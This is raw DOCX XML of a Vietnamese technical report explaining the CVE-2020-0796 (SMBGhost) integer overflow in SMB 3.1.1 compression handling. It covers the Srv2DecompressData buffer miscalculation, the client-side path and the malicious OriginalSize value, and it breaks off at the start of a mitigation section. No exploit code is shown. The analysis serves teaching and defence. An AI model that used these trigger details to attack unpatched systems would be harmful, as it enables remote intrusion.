    <w:p w14:paraId="02D631F8"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Nguyên nhân chính của lỗ hổng là một kỹ thuật xử lý gói tin không đúng trong SMB 3.1.1, mà kẻ tấn công có thể khai thác để thực hiện tấn công Remote Code Execution (RCE). Thông qua việc gửi một loạt các gói tin được tạo ra đặc biệt, kẻ tấn công có thể làm cho máy chủ hoặc máy khách SMB mục tiêu thực thi mã độc hại từ xa mà không cần bất kỳ xác thực nào.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6F0B0F" w14:textId="4C3F8D8B" w:rsidR="0036465C"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 xml:space="preserve">Tính năng RCE làm tăng nguy cơ, vì nó mở ra khả năng kiểm soát toàn bộ hệ thống mục tiêu. Điều này có thể dẫn đến nhiều hậu quả nghiêm trọng, từ mất mát dữ liệu đến việc thực hiện các hành động độc hại. Microsoft đã phát hành bản vá để khắc phục lỗ hổng này, nhưng nguy cơ vẫn tồn tại nếu các hệ thống không </w:t>
      </w:r>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>được cập nhật đúng cách. Việc triển khai bản vá ngay lập tức là quan trọng để giảm thiểu rủi ro và bảo vệ hệ thống khỏi các mối đe dọa an ninh liên quan đến CVE-2020-0796</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC045C0" w14:textId="30F8EB90" w:rsidR="000969E0" w:rsidRPr="000969E0"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t>Lỗ hổng xảy ra trong quá trình xử lý tin nhắn nén không đúng định dạng. Tiêu đề của tin nhắn có định dạng sau: (từ [MS-SMB2])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618A4779" w14:textId="77777777" w:rsidR="00F440BB" w:rsidRDefault="000969E0" w:rsidP="00F440BB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="29"/>
          <w:szCs w:val="29"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C81BA02" wp14:editId="7FAF7347">
            <wp:extent cx="5758815" cy="2591435"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="111077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2591435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE227A2" w14:textId="25048F90" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00F440BB" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc185277495"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>SMB2 COMPRESSION_TRANSFORM_HEADER</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="45028356" w14:textId="77777777" w:rsid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t>Có hai tham số trong tiêu đề được quan tâm: OriginalCompressionSegmentSize và Offset/Length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5BAB82" w14:textId="77777777" w:rsid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t>Hàm Srv2DecompressData (srv2.sys) phân bổ bộ đệm có kích thước OriginalCompressionSegmentSize + Offset/Length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C6423D" w14:textId="77777777" w:rsid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t>Điều này không kiểm tra tính xác thực của các giá trị này và khi phần bổ sung được ký, kẻ tấn công có thể phân bổ bộ đệm nhỏ hơn dự định</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1850BA36" w14:textId="77777777" w:rsid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t>Dữ liệu đang được giải nén tại bộ đệm + offset, sử dụng dữ liệu từ gói+0x10+offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0F42E2" w14:textId="77777777" w:rsid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t>OriginalCompressionSegmentSize được sử dụng làm tham số UncompressionBufferSize được truyền cho SmbCompressionDecompression, một trình bao bọc cho RtlDecompressBufferEx2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411D13FD" w14:textId="77777777" w:rsid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lastRenderedPageBreak/>
        <w:t>Quy trình này giả định kích thước bộ đệm không nén là không dấu dài nên giá trị âm sẽ được chuyển thành số lớn không dấu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC13C1F" w14:textId="422FDC23" w:rsidR="000969E0" w:rsidRPr="00746169" w:rsidRDefault="000969E0" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00746169">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Do đó, quy trình giải nén sẽ giải nén bộ đệm và có thể vượt xa kích thước ban đầu, vì nó giả định rằng nó có một bộ đệm rất lớn để làm việc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C5650C" w14:textId="77777777" w:rsidR="000969E0" w:rsidRDefault="000969E0" w:rsidP="00746169">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Đây là phần phân tích có chú thích của chức năng liên quan ở phía máy chủ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A854EC" w14:textId="77777777" w:rsidR="00F440BB" w:rsidRDefault="000969E0" w:rsidP="00F440BB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58BEC532" wp14:editId="5982DBBB">
            <wp:extent cx="5758815" cy="4268470"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="103094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68470"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7E5DE0" w14:textId="19A8EE66" w:rsidR="000969E0" w:rsidRDefault="00F440BB" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc185277496"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Disassembly được chú thích của Hàm Liên quan Phía Máy Chủ </w:t>
      </w:r>
      <w:r w:rsidR="000969E0">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="5EC60144" w14:textId="77777777" w:rsidR="00F440BB" w:rsidRDefault="000969E0" w:rsidP="00F440BB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F6D372B" wp14:editId="1BEAA3A1">
            <wp:extent cx="5758815" cy="4066540"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="647047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4066540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5260922C" w14:textId="5EA26355" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00F440BB" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc185277497"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Disassembly được chú thích của Hàm Liên quan Phía Máy Chủ - 2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="5DD48663" w14:textId="77777777" w:rsidR="000969E0" w:rsidRPr="000969E0"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t>Lỗ hổng này có thể ảnh hưởng đến cả máy khách và máy chủ trong các cuộc đàm phán SMB trong một tin nhắn nén được gửi sau Phản hồi giao thức đàm phán. Lỗ hổng máy chủ nằm trong srv2.sys và lỗ hổng máy khách nằm trong mrxsmb.sys, cả hai đều gọi cùng một mã trong SmbCompressDecompress.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D346D17" w14:textId="77777777" w:rsidR="000969E0"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t>Đây là phần phân tách có chú thích của hàm liên quan ở phía máy khách – không giống như phía máy chủ, OriginalCompressionSegmentSize được kiểm tra giới hạn nhưng không có kiểm tra về độ lệch/độ dài trước khi chúng được kết hợp và chuyển đến ExAllocatePoolWithtag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790BB81A" w14:textId="77777777" w:rsidR="00F440BB" w:rsidRDefault="000969E0" w:rsidP="00F440BB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E3B00E3" wp14:editId="28D54A6B">
            <wp:extent cx="5758815" cy="2408555"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1366247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2408555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7001AB4F" w14:textId="2E8FC1FD" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00F440BB" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc185277498"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Disassembly được chú thích của Hàm Liên quan Phía Máy Khách - 1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="0B15E9FE" w14:textId="77777777" w:rsidR="000969E0"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t>Nếu một máy tính cho phép lưu lượng truy cập SMB3 gửi đến qua cổng 445, theo mặc định, tính năng nén được hỗ trợ và máy khách và máy chủ sẽ thương lượng các “điều khoản” của việc nén này, sau đó máy khách sẽ tiến hành truyền tải trọng đã nén.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635CB1A0" w14:textId="77777777" w:rsidR="00F440BB" w:rsidRDefault="000969E0" w:rsidP="00F440BB">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="24E0B7BC" wp14:editId="5EF04BCB">
            <wp:extent cx="5758815" cy="516890"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="216826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516890"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB6B0E0" w14:textId="57476832" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00F440BB" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc185277499"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00746169">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>SMB3 qua cổng 445.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="3DAC3D9E" w14:textId="77777777" w:rsidR="000969E0"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t>Lỗ hổng tồn tại trong SMB Compression Transform Header, trước bất kỳ hình thức xác thực nào.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB41D82" w14:textId="77777777" w:rsidR="00746169" w:rsidRDefault="000969E0" w:rsidP="00746169">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FCD4180" wp14:editId="6A25FB1D">
            <wp:extent cx="5478145" cy="2074545"/>
            <wp:effectExtent l="0" t="0" r="8255" b="1905"/>
            <wp:docPr id="930816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2074545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE3633E" w14:textId="4B1B2212" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00746169" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc185277500"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>SMB Compression Transform Header</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="5D633B95" w14:textId="77777777" w:rsidR="000969E0" w:rsidRPr="000969E0"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lastRenderedPageBreak/>
        <w:t xml:space="preserve"> Chúng ta có thể thấy OriginalSize rất lớn được sử dụng cho dữ liệu do kẻ tấn công kiểm soát (4294967295 là 0xFFFFFFFF ở dạng hex và cũng là -1 nếu được xem dưới dạng ký dài). Điều này được sao chép vào một bộ đệm cố định nhỏ hơn và dẫn đến tràn bộ đệm cổ điển. Đáng chú ý là ProtocolID của \xfcSMB, phải có mặt và đại diện cho các byte ma thuật được sử dụng để biểu thị thông báo phải được giải nén theo thông số kỹ thuật.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4650219C" w14:textId="77777777" w:rsidR="00746169" w:rsidRDefault="000969E0" w:rsidP="00746169">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:szCs w:val="28"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F76197F" wp14:editId="75B07492">
            <wp:extent cx="5758815" cy="500380"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2014969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500380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="49846EC0" w14:textId="1EB182B2" w:rsidR="000969E0" w:rsidRPr="000969E0" w:rsidRDefault="00746169" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc185277501"/>
      <w:r>
        <w:t xml:space="preserve">Hình 2. </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_2. \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000969E0" w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Buffer Overflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="2E7268AB" w14:textId="78998D7E" w:rsidR="000969E0" w:rsidRPr="00A5474D" w:rsidRDefault="000969E0" w:rsidP="000969E0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000969E0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Tuy nhiên, không chỉ phía máy chủ dễ bị tấn công bởi cuộc tấn công này. Nếu máy khách kết nối với máy chủ SMB độc hại, cả hai bên đều chạy cùng một mã dễ bị tấn công và máy chủ độc hại có thể phản hồi các yêu cầu của máy khách theo cùng một cách để kích hoạt tình trạng tràn ở phía bộ khởi tạo/máy khách. Trong trường hợp này, lệnh Windows Powershell được tham chiếu ở đây sẽ không có hiệu quả trong việc ngăn chặn cuộc tấn công này nhằm vào máy khách SMB. Nó sẽ chỉ hữu ích khi được triển khai trên xác thực trước máy chủ SMB/phía người nhận.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05083AD6" w14:textId="34CC3A55" w:rsidR="0036465C" w:rsidRPr="00A5474D" w:rsidRDefault="00184F6A" w:rsidP="0036465C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc185277781"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Cách khắc phục lỗ hổng</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="6F050332" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="009160F0" w:rsidP="00184F6A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009160F0">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve">Kiểm tra </w:t>
      </w:r>
      <w:r w:rsidR="00184F6A" w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
